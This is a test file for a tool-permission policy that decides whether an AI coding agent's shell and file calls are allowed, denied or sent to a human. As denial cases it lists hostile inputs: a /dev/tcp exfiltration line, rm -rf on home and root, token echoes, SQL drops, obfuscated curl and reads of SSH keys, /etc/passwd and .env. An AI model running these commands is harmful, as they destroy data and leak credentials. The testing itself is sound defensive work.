import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import type { ToolCall, ToolDecision, ToolProfile } from "@opscrew/contracts";
import { describe, expect, it } from "vitest";
import { DefaultToolPolicy, isSecretPath, PROFILE_TOOLS, splitShellCommand } from "./policy";

const PROFILES: ToolProfile[] = ["none", "read-only", "edit-repo"];

interface HostEnv {
  platform: "linux" | "win32";
  root: string;
}
const POSIX: HostEnv = { platform: "linux", root: "/home/dev/app" };
const WIN: HostEnv = { platform: "win32", root: String.raw`C:\Users\dev\app` };
const PLATFORMS = [POSIX, WIN];

function loadCorpus(name: string): string[] {
  const file = fileURLToPath(new URL(`../test/fixtures/policy/${name}`, import.meta.url));
  return readFileSync(file, "utf8")
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line !== "" && !line.startsWith("#"));
}

function call(
  tool: string,
  input: Record<string, unknown>,
  profile: ToolProfile = "edit-repo",
  projectRoot: string = POSIX.root,
): ToolCall {
  return { tool, input, profile, projectRoot, phase: "adapt" };
}

const posixPolicy = new DefaultToolPolicy({ platform: "linux" });
const winPolicy = new DefaultToolPolicy({ platform: "win32" });

function decide(
  tool: string,
  input: Record<string, unknown>,
  profile: ToolProfile = "edit-repo",
  env = POSIX,
): ToolDecision {
  const policy = env.platform === "win32" ? winPolicy : posixPolicy;
  return policy.evaluate(call(tool, input, profile, env.root));
}

const bash = (command: string, profile: ToolProfile = "edit-repo", env = POSIX) =>
  decide("Bash", { command }, profile, env);

describe("PROFILE_TOOLS", () => {
  it("maps each profile to its built-in tools", () => {
    expect(PROFILE_TOOLS.none).toEqual([]);
    expect(PROFILE_TOOLS["read-only"]).toEqual(["Read", "Glob", "Grep"]);
    expect(PROFILE_TOOLS["edit-repo"]).toEqual(["Read", "Glob", "Grep", "Edit", "Write", "Bash"]);
  });
});

describe("DefaultToolPolicy: tool gating order", () => {
  it("allows the OpsCrew MCP server's tools in every profile and denies other MCP servers", () => {
    for (const profile of PROFILES) {
      expect(decide("mcp__opscrew__scan_repo", {}, profile).decision).toBe("allow");
      expect(decide("mcp__github__create_pull_request", {}, profile).decision).toBe("deny");
      expect(decide("mcp__opscrew__", {}, profile).decision).toBe("deny");
      expect(decide("mcp__opscrewx__scan", {}, profile).decision).toBe("deny");
    }
  });

  it("honours a custom MCP server name", () => {
    const policy = new DefaultToolPolicy({ mcpServerName: "crew", platform: "linux" });
    expect(policy.evaluate(call("mcp__crew__scan", {}, "none")).decision).toBe("allow");
    expect(policy.evaluate(call("mcp__opscrew__scan", {}, "none")).decision).toBe("deny");
  });

  it("allows TodoWrite in every profile", () => {
    for (const profile of PROFILES) {
      expect(decide("TodoWrite", { todos: [] }, profile).decision).toBe("allow");
    }
  });

  it("denies web, sub-agent, notebook and shell-control tools and unknown tools everywhere", () => {
    const tools = [
      "WebFetch",
      "WebSearch",
      "Task",
      "Agent",
      "NotebookEdit",
      "KillShell",
      "BashOutput",
      "SomethingNew",
      "read",
      "",
    ];
    for (const profile of PROFILES) {
      for (const tool of tools) {
        const result = decide(tool, { url: "https://example.com" }, profile);
        expect(result.decision, `${tool} in ${profile}`).toBe("deny");
      }
    }
  });

  it("denies built-in tools outside the profile with a reason naming the profile", () => {
    const result = decide("Write", { file_path: "/home/dev/app/a.txt", content: "" }, "read-only");
    expect(result).toEqual({
      decision: "deny",
      reason: expect.stringContaining("not allowed in the read-only profile"),
    });
    for (const tool of ["Write", "Edit", "MultiEdit", "Bash"]) {
      const input = { file_path: "/home/dev/app/a.txt", command: "ls" };
      expect(decide(tool, input, "read-only").decision, tool).toBe("deny");
    }
    for (const tool of ["Read", "Glob", "Grep", "Write", "Edit", "Bash"]) {
      const input = { file_path: "/home/dev/app/a.txt", command: "ls" };
      expect(decide(tool, input, "none").decision, tool).toBe("deny");
    }
  });

  it("treats MultiEdit as Edit", () => {
    const input = { file_path: "/home/dev/app/src/a.ts", edits: [] };
    expect(decide("MultiEdit", input, "edit-repo").decision).toBe("allow");
    expect(decide("MultiEdit", input, "read-only").decision).toBe("deny");
  });

  it("denies unknown profiles (fail closed)", () => {
    const result = posixPolicy.evaluate(
      call("Read", { file_path: "/home/dev/app/a.ts" }, "admin" as ToolProfile),
    );
    expect(result.decision).toBe("deny");
  });
});

describe("DefaultToolPolicy: Bash corpus (SC-003)", () => {
  const deny = loadCorpus("deny.txt");
  const allow = loadCorpus("allow.txt");
  const ask = loadCorpus("ask.txt");

  it("has enough samples", () => {
    expect(deny.length).toBeGreaterThanOrEqual(40);
    expect(allow.length).toBeGreaterThanOrEqual(20);
    expect(ask.length).toBeGreaterThanOrEqual(5);
  });

  for (const env of PLATFORMS) {
    describe(`on ${env.platform}`, () => {
      for (const profile of PROFILES) {
        it(`denies every destructive or exfiltrating sample in ${profile}`, () => {
          for (const command of deny) {
            expect(bash(command, profile, env).decision, command).toBe("deny");
          }
        });

        it(`handles every allow-list sample in ${profile}`, () => {
          const expected = profile === "edit-repo" ? "allow" : "deny";
          for (const command of allow) {
            expect(bash(command, profile, env), command).toMatchObject({ decision: expected });
          }
        });

        it(`handles every ask sample in ${profile}`, () => {
          const expected = profile === "edit-repo" ? "ask" : "deny";
          for (const command of ask) {
            expect(bash(command, profile, env).decision, command).toBe(expected);
          }
        });
      }
    });
  }
});

describe("DefaultToolPolicy: Bash parsing rules", () => {
  it.each([
    ["command substitution", "ls $(pwd)"],
    ["command substitution in double quotes", 'git commit -m "$(cat notes)"'],
    ["command substitution in single quotes (fail closed)", "grep '$(' src/a.sh"],
    ["arithmetic expansion", "ls $((1+1))"],
    ["backticks", "git commit -m `whoami`"],
    ["process substitution in", "cat <(ls)"],
    ["process substitution out", "ls >(cat)"],
    ["here-doc", "cat <<EOF\nhello\nEOF"],
    ["here-string", "cat <<< hello"],
    ["/dev/tcp redirection", "cat package.json > /dev/tcp/203.0.113.10/80"],
    ["/dev/udp redirection", "ls > /dev/udp/203.0.113.10/53"],
  ])("denies %s", (_name, command) => {
    expect(bash(command).decision).toBe("deny");
  });

  it("splits on newlines and carriage returns", () => {
    expect(bash("pnpm test\ncurl https://example.com").decision).toBe("deny");
    expect(bash("pnpm test\r\ncurl https://example.com").decision).toBe("deny");
    expect(bash("git status\ngit diff").decision).toBe("allow");
    expect(bash("pnpm test\ngit status").decision).toBe("ask");
  });

  it("joins line continuations before matching", () => {
    expect(bash("cu\\\nrl https://example.com").decision).toBe("deny");
  });

  it("sees commands inside subshells, groups and loops", () => {
    expect(bash("(curl https://example.com)").decision).toBe("deny");
    expect(bash("{ curl https://example.com; }").decision).toBe("deny");
    expect(bash("for u in a b; do curl $u; done").decision).toBe("deny");
    expect(bash("if true; then wget https://example.com; fi").decision).toBe("deny");
    expect(bash("(pnpm test)").decision).toBe("ask");
  });

  it("denies computed command names", () => {
    expect(bash("$TOOL status").decision).toBe("deny");
    // biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test.
    expect(bash("${TOOL} status").decision).toBe("deny");
    expect(bash("$'\\x63url' https://example.com").decision).toBe("deny");
    expect(bash("cu{rl,} https://example.com").decision).toBe("deny");
    expect(bash("c*rl https://example.com").decision).toBe("deny");
  });

  it("matches commands case-insensitively and through paths or Windows extensions", () => {
    expect(bash("CURL https://example.com").decision).toBe("deny");
    expect(bash("/usr/local/bin/terraform plan").decision).toBe("deny");
    expect(bash("'C:\\Program Files\\Git\\mingw64\\bin\\curl.exe' https://x.test").decision).toBe(
      "deny",
    );
    expect(bash("npm.cmd publish").decision).toBe("deny");
  });

  it("sees through wrappers", () => {
    for (const command of [
      "command curl https://example.com",
      "exec ssh host",
      "timeout 10 curl https://example.com",
      "nice -n 5 terraform apply",
      "xargs -I {} curl {}",
      "stdbuf -oL wget https://example.com",
      "env FOO=1 ls",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
    expect(bash("timeout 60 pnpm test").decision).toBe("ask");
  });

  it("denies shells and interpreters running inline code", () => {
    for (const command of [
      "bash -lc 'ls'",
      "zsh -c ls",
      "sh -ec ls",
      "python -c 'print(1)'",
      "python3 -c 'print(1)'",
      "node --eval 'process.exit(0)'",
      "node -p process.env",
      "perl -e 'print 1'",
      "ruby -e 'puts 1'",
      "bun -e 'console.log(1)'",
      "cat scripts/x.sh | sh",
      "cat scripts/x.sh | bash -s",
      "bash",
      "cat app.py | python -",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
    expect(bash("bash scripts/build.sh").decision).toBe("ask");
  });

  it("does not let `--` smuggle package names into an install", () => {
    expect(bash("npm install -- left-pad").decision).toBe("ask");
    expect(bash("pnpm i -- left-pad").decision).toBe("ask");
    // Package scripts run project code an agent could have edited, so they always need approval.
    expect(bash("pnpm run test -- --watch=false").decision).toBe("ask");
  });

  it("never pre-approves cd, because paths are checked against the project root", () => {
    expect(bash("cd src && ls").decision).toBe("ask");
    expect(bash("cd / && rm -rf usr").decision).toBe("ask");
  });

  it("denies the git publishing and history-rewrite family however it is spelled", () => {
    for (const command of [
      "git push",
      "git --no-pager push",
      "git -C ../other push",
      "git --git-dir=.git push",
      "git remote -v",
      "git config --list",
      "git credential-store get",
      "git reset --hard",
      "git reset --hard origin/main",
      "git clean -n",
      "git filter-repo --force",
      "git send-email patch.diff",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
    expect(bash("git reset HEAD~1").decision).toBe("deny");
  });

  it("denies rm -rf variants on dangerous targets and asks for project paths", () => {
    for (const command of [
      "rm -rf /",
      "rm -Rf /*",
      "rm -fr ~/",
      "rm -r -f ~",
      "rm --recursive --force $HOME",
      'rm -rf "$HOME"',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test.
      "rm -rf ${HOME}",
      "rm -rfv ../",
      "rm -rf ../app",
      "rm -rf .",
      "rm -rf ./*",
      "rm -rf src/*",
      "rm -rf /home/dev/app",
      "rm -rf opscrew",
      "rm -rf .opscrew",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
    expect(bash("rm -rf dist").decision).toBe("ask");
    expect(bash("rm notes.txt").decision).toBe("ask");
  });

  it("denies echo or printf of variables", () => {
    expect(bash("echo $HOME").decision).toBe("deny");
    // biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test.
    expect(bash("echo ${GITHUB_TOKEN}").decision).toBe("deny");
    expect(bash("printf '%s' \"$NPM_TOKEN\"").decision).toBe("deny");
    expect(bash("echo hello").decision).toBe("ask");
  });

  it("denies SQL drops anywhere in the command", () => {
    expect(bash('psql "$DATABASE_URL" -c "drop   table users"').decision).toBe("deny");
    expect(bash("sqlite3 app.db 'DROP DATABASE x'").decision).toBe("deny");
  });

  it("denies docker and package-manager variants", () => {
    for (const command of [
      "docker build --push -t app .",
      "docker container run alpine",
      "docker image push app",
      "docker volume prune",
      "podman run alpine",
      "npm exec some-package",
      "bun x some-package",
      "bun publish",
      "npm unpublish app",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
  });

  it("denies find actions that execute or delete", () => {
    for (const command of [
      "find . -exec cat {} +",
      "find . -execdir ls ;",
      "find . -ok rm {} ;",
      "find . -fprint out.txt",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
  });

  it("checks redirection targets", () => {
    expect(bash("git status > test-output.txt").decision).toBe("allow");
    expect(bash("git diff 2> errors.log").decision).toBe("allow");
    expect(bash("git log &> all.log").decision).toBe("allow");
    expect(bash("ls -la >| out.txt").decision).toBe("allow");
    expect(bash("ls > /tmp/listing").decision).toBe("deny");
    expect(bash("ls > ../listing").decision).toBe("deny");
    expect(bash("ls > $OUT").decision).toBe("deny");
    expect(bash("ls >> .opscrew/x").decision).toBe("deny");
    expect(bash("ls > opscrew/notes.md").decision).toBe("deny");
    expect(bash("ls > .github/workflows/opscrew-deploy.yml").decision).toBe("deny");
    expect(bash("ls > .env").decision).toBe("deny");
    expect(bash("wc -l < /etc/passwd").decision).toBe("ask");
    expect(bash("wc -l < .env.production").decision).toBe("deny");
    expect(bash("wc -l < src/index.ts").decision).toBe("allow");
  });

  it("asks for reads outside the project root and for unverifiable arguments", () => {
    for (const command of [
      "cat /etc/passwd",
      "ls ~",
      "ls ~/projects",
      "cat ../secrets.txt",
      "ls $HOME",
      "cat src/$FILE",
      "grep -R key .",
      "grep --recursive key src",
      "grep -rn key src",
      "find / -name '*.log'",
      "head --lines=5 /var/log/syslog",
      "cat *",
      "git diff --output=/tmp/x",
      "tree -o tree.txt",
      "pnpm install --prefix=/",
      "npm install --global",
      "pnpm install -g",
      "pip install requests",
      "pip install -r requirements.txt --index-url=https://example.com/simple",
      "go test -exec ./wrapper ./...",
      "node --version --inspect",
    ]) {
      expect(bash(command).decision, command).toBe("ask");
    }
  });

  it("denies every git write so agents cannot hide changes from the reviewed diff", () => {
    for (const command of [
      "git add -f build/",
      "git add '*.ts'",
      "git add src/index.ts",
      'git commit -m "$MSG"',
      'git commit -m "fix"',
      "git branch --delete old",
      "git checkout -b feat/x",
      "git switch -c fix/y",
      "git stash",
      "git restore src/a.ts",
    ]) {
      expect(bash(command).decision, command).toBe("deny");
    }
    expect(bash("git status").decision).toBe("allow");
    expect(bash("git diff --stat").decision).toBe("allow");
  });

  it("asks before running project code (package scripts, installs, Dockerfiles, tests)", () => {
    for (const command of [
      "npm install",
      "pnpm run build",
      "pnpm test",
      "docker build .",
      "python -m pytest",
      "go test ./...",
      "make build",
    ]) {
      const result = bash(command);
      expect(result.decision, command).toBe("ask");
      expect(result.decision === "ask" ? result.reason : "").toContain(
        "runs code from the project",
      );
    }
  });

  it("denies writes through mkdir outside the root or into protected paths", () => {
    expect(bash("mkdir -p ../sibling").decision).toBe("deny");
    expect(bash("mkdir -p opscrew/infra").decision).toBe("deny");
    expect(bash("mkdir -p src/a src/b").decision).toBe("allow");
  });

  it("denies secret references hidden in flag values and git object names", () => {
    expect(bash("docker build --secret id=env,src=.env .").decision).toBe("deny");
    expect(bash("git diff HEAD:.env.local").decision).toBe("deny");
    expect(bash("git commit -F .env").decision).toBe("deny");
    expect(bash("cat --file=id_rsa").decision).toBe("deny");
  });

  it("returns ask with a reason naming the unmatched segment", () => {
    const result = bash("git status && make build");
    expect(result).toEqual({ decision: "ask", reason: expect.stringContaining("make build") });
  });

  it("denies empty, missing, non-string and unparseable commands", () => {
    expect(bash("").decision).toBe("deny");
    expect(bash("   ").decision).toBe("deny");
    expect(bash(";;").decision).toBe("deny");
    expect(decide("Bash", {}).decision).toBe("deny");
    expect(decide("Bash", { command: 42 }).decision).toBe("deny");
    expect(bash("echo 'unterminated").decision).toBe("deny");
    expect(bash('ls "unterminated').decision).toBe("deny");
    expect(bash("ls\0").decision).toBe("deny");
  });

  it("evaluates Bash path arguments against a Windows project root", () => {
    expect(bash("cat src/index.ts", "edit-repo", WIN).decision).toBe("allow");
    expect(bash("cat 'C:\\Users\\dev\\app\\src\\index.ts'", "edit-repo", WIN).decision).toBe(
      "allow",
    );
    expect(bash("cat 'c:/users/DEV/App/package.json'", "edit-repo", WIN).decision).toBe("allow");
    expect(bash("cat 'D:\\other\\file.txt'", "edit-repo", WIN).decision).toBe("ask");
    expect(bash("cat 'C:\\Users\\dev\\.ssh\\id_ed25519'", "edit-repo", WIN).decision).toBe("deny");
    expect(bash("mkdir -p 'D:\\evil'", "edit-repo", WIN).decision).toBe("deny");
  });
});

describe("splitShellCommand", () => {
  it("splits on control operators and newlines", () => {
    expect(splitShellCommand("a && b || c; d | e & f\ng")).toEqual([
      "a",
      "b",
      "c",
      "d",
      "e",
      "f",
      "g",
    ]);
    expect(splitShellCommand("a |& b")).toEqual(["a", "b"]);
  });

  it("keeps quoted operators and redirections inside a segment", () => {
    expect(splitShellCommand("git commit -m 'a && b; c | d'")).toEqual([
      "git commit -m 'a && b; c | d'",
    ]);
    expect(splitShellCommand('echo "x;y" && ls')).toEqual(['echo "x;y"', "ls"]);
    expect(splitShellCommand("pnpm test 2>&1 | tee log")).toEqual(["pnpm test 2>&1", "tee log"]);
    expect(splitShellCommand("pnpm test &> log; ls >| out")).toEqual([
      "pnpm test &> log",
      "ls >| out",
    ]);
    expect(splitShellCommand("a \\; b")).toEqual(["a \\; b"]);
  });

  it("drops empty segments", () => {
    expect(splitShellCommand("  ;; a ;  ")).toEqual(["a"]);
    expect(splitShellCommand("")).toEqual([]);
  });
});

describe("isSecretPath", () => {
  it.each([
    ".env",
    ".env.local",
    ".env.production",
    "config/.env",
    "/home/dev/app/.env.staging",
    String.raw`C:\Users\dev\app\.env`,
    ".ENV",
    ".env.",
    ".env ",
    ".env::$DATA",
    ".envrc",
    "certs/server.pem",
    "tls/private.key",
    "store.p12",
    "cert.pfx",
    "keystore.jks",
    "release.keystore",
    "terraform.tfstate",
    "infra/terraform.tfstate.backup",
    "terraform.tfstate.1700000000.backup",
    "prod.tfvars",
    "secrets.auto.tfvars",
    "terraform.tfvars.json",
    "id_rsa",
    "id_rsa.pub",
    "id_ed25519",
    "id_ecdsa_sk",
    "deploy.ppk",
    ".npmrc",
    ".pypirc",
    ".netrc",
    ".pgpass",
    ".git-credentials",
    "/home/dev/.aws/credentials",
    "known_hosts",
    "/home/dev/.ssh/config",
    ".ssh",
    "~/.aws/config",
    ".gnupg/pubring.kbx",
    ".docker/config.json",
    ".terraform/providers/x",
    ".opscrew/state.json",
    ".git/config",
    ".git/hooks/pre-commit",
    ".git",
    "vendor/lib/.git/HEAD",
    ".kube/config",
    "/home/dev/.config/gh/hosts.yml",
    "/home/dev/.config/hcloud/cli.toml",
    ".terraform.d/credentials.tfrc.json",
  ])("treats %s as secret", (p) => {
    expect(isSecretPath(p)).toBe(true);
  });

  it.each([
    ".env.example",
    ".env.sample",
    ".env.template",
    ".env.dist",
    "config/.ENV.Example",
    ".gitignore",
    ".gitattributes",
    ".github/workflows/ci.yml",
    "src/index.ts",
    "package.json",
    "README.md",
    "environment.ts",
    "src/env.ts",
    "main.tf",
    "variables.tf",
    ".terraform.lock.hcl",
    "keys.ts",
    "monkey.json",
    "credentials.md",
    "opscrew/plan.yaml",
    "",
  ])("does not treat %s as secret", (p) => {
    expect(isSecretPath(p)).toBe(false);
  });
});

describe("DefaultToolPolicy: file tools", () => {
  const read = (file_path: unknown, env = POSIX, profile: ToolProfile = "read-only") =>
    decide("Read", { file_path }, profile, env).decision;
  const write = (file_path: unknown, env = POSIX) =>
    decide("Write", { file_path, content: "x" }, "edit-repo", env).decision;
  const edit = (file_path: unknown, env = POSIX) =>
    decide("Edit", { file_path, old_string: "a", new_string: "b" }, "edit-repo", env).decision;

  it("allows read-only samples in the read-only profile (SC-003)", () => {
    const samples: Array<[string, Record<string, unknown>]> = [
      ["Read", { file_path: "/home/dev/app/package.json" }],
      ["Read", { file_path: "/home/dev/app/src/index.ts", offset: 1, limit: 10 }],
      ["Read", { file_path: "src/index.ts" }],
      ["Read", { file_path: "/home/dev/app/.env.example" }],
      ["Read", { file_path: "/home/dev/app/opscrew/plan.yaml" }],
      ["Glob", { pattern: "**/*.ts" }],
      ["Glob", { pattern: "*.json", path: "/home/dev/app/src" }],
      ["Grep", { pattern: "TODO" }],
      ["Grep", { pattern: "TODO", path: "src", glob: "*.ts" }],
      ["Grep", { pattern: "process\\.env", path: "/home/dev/app" }],
    ];
    for (const [tool, input] of samples) {
      for (const profile of ["read-only", "edit-repo"] as const) {
        expect(decide(tool, input, profile).decision, `${tool} ${JSON.stringify(input)}`).toBe(
          "allow",
        );
      }
    }
  });

  it("denies paths outside the project root (POSIX)", () => {
    expect(read("/etc/passwd")).toBe("deny");
    expect(read("/home/dev/app/../other/file.txt")).toBe("deny");
    expect(read("../other/file.txt")).toBe("deny");
    expect(read("src/../../other/file.txt")).toBe("deny");
    expect(read("/home/dev/app-evil/file.txt")).toBe("deny");
    expect(read("/home/dev")).toBe("deny");
    expect(read("/home/dev/App/package.json")).toBe("deny");
    expect(read("~/notes.txt")).toBe("deny");
    expect(read("/home/dev/app/src/../package.json")).toBe("allow");
    expect(read("/home/dev/app")).toBe("allow");
  });

  it("resolves Windows paths case-insensitively and denies other drives (win32)", () => {
    expect(read(String.raw`C:\Users\dev\app\src\index.ts`, WIN)).toBe("allow");
    expect(read(String.raw`c:\users\DEV\APP\src\index.ts`, WIN)).toBe("allow");
    expect(read("C:/Users/dev/app/package.json", WIN)).toBe("allow");
    expect(read(String.raw`src\index.ts`, WIN)).toBe("allow");
    expect(read(String.raw`D:\Users\dev\app\src\index.ts`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app2\x.ts`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\..\other\x.ts`, WIN)).toBe("deny");
    expect(read(String.raw`..\other\x.ts`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Windows\System32\drivers\etc\hosts`, WIN)).toBe("deny");
    expect(read("/etc/passwd", WIN)).toBe("deny");
  });

  it("denies Windows path forms that could escape or alias files (win32)", () => {
    expect(read("D:foo.txt", WIN)).toBe("deny");
    expect(read("c:foo.txt", WIN)).toBe("deny");
    expect(read(String.raw`\\server\share\x.txt`, WIN)).toBe("deny");
    expect(read(String.raw`\\?\C:\Users\dev\app\package.json`, WIN)).toBe("deny");
    expect(read(String.raw`\\.\C:\Users\dev\app\package.json`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\.env::$DATA`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\notes.txt:hidden`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\ENV~1`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\.env.`, WIN)).toBe("deny");
    expect(read(String.raw`C:\Users\dev\app\.ENV`, WIN)).toBe("deny");
  });

  it("denies secret files inside the root", () => {
    for (const env of PLATFORMS) {
      const base = env.platform === "win32" ? `${env.root}\\` : `${env.root}/`;
      for (const rel of [".env", ".env.local", "certs/tls.key", ".git/config", ".opscrew/x"]) {
        expect(read(base + rel, env), rel).toBe("deny");
        expect(read(rel, env), rel).toBe("deny");
      }
    }
  });

  it("denies writes to protected locations but allows reads where not secret", () => {
    for (const rel of [
      ".git/hooks/pre-commit",
      "vendor/lib/.git/config",
      ".opscrew/state.json",
      "opscrew/plan.yaml",
      "opscrew/infra/main.tf",
      "OpsCrew/plan.yaml",
      ".github/workflows/opscrew-deploy.yml",
      ".GitHub/Workflows/OpsCrew-Deploy.yml",
      ".env",
      "../outside.txt",
      "/tmp/x.txt",
    ]) {
      expect(write(rel), rel).toBe("deny");
      expect(edit(rel), rel).toBe("deny");
      expect(decide("MultiEdit", { file_path: rel, edits: [] }).decision, rel).toBe("deny");
    }
    expect(read("opscrew/plan.yaml", POSIX, "edit-repo")).toBe("allow");
    expect(read(".github/workflows/opscrew-deploy.yml", POSIX, "edit-repo")).toBe("allow");
    expect(write(".github/workflows/ci.yml")).toBe("allow");
    expect(write("src/opscrew/helper.ts")).toBe("allow");
    expect(write("/home/dev/app/src/new.ts")).toBe("allow");
    expect(write(".gitignore")).toBe("allow");
    expect(write("/home/dev/app")).toBe("deny");
    expect(write(String.raw`C:\Users\dev\app\opscrew\plan.yaml`, WIN)).toBe("deny");
    expect(write(String.raw`c:\users\dev\app\.GIT\config`, WIN)).toBe("deny");
    expect(write(String.raw`C:\Users\dev\app\src\new.ts`, WIN)).toBe("allow");
  });

  it("checks Glob and Grep paths and patterns", () => {
    expect(decide("Glob", { pattern: "*", path: "/etc" }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "*", path: ".." }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "*", path: ".ssh" }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "/etc/**" }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "../**/*.ts" }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "~/**" }).decision).toBe("deny");
    expect(decide("Glob", { pattern: "C:/Windows/**" }, "read-only", WIN).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", path: ".git" }).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", path: "/home" }).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", glob: ".env*" }).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", glob: "**/*.pem" }).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", glob: "../**" }).decision).toBe("deny");
    expect(decide("Grep", { pattern: "x", path: 7 }).decision).toBe("deny");
  });

  it("denies missing or malformed file paths", () => {
    expect(read(undefined)).toBe("deny");
    expect(read("")).toBe("deny");
    expect(read(42)).toBe("deny");
    expect(read("src/a\0.ts")).toBe("deny");
    expect(decide("Write", { content: "x" }).decision).toBe("deny");
  });

  it("denies everything file-related when the project root is not absolute", () => {
    const policy = new DefaultToolPolicy({ platform: "linux" });
    expect(policy.evaluate(call("Read", { file_path: "a.ts" }, "read-only", "app")).decision).toBe(
      "deny",
    );
    expect(policy.evaluate(call("Bash", { command: "ls" }, "edit-repo", "")).decision).toBe("deny");
  });

  it("uses the host platform by default", () => {
    const policy = new DefaultToolPolicy();
    const root = process.platform === "win32" ? String.raw`C:\work\app` : "/work/app";
    expect(policy.evaluate(call("Read", { file_path: "src/a.ts" }, "read-only", root))).toEqual({
      decision: "allow",
    });
  });
});
